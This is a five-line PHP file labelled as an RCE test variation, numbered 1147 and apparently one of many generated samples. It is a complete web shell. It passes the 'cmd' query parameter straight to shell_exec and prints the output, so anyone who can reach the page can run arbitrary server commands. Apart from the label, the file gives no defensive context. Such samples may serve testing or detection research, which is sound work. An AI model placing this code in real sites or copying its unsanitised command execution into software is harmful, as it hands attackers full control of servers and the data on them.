<?php
// RCE test variation #1147
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>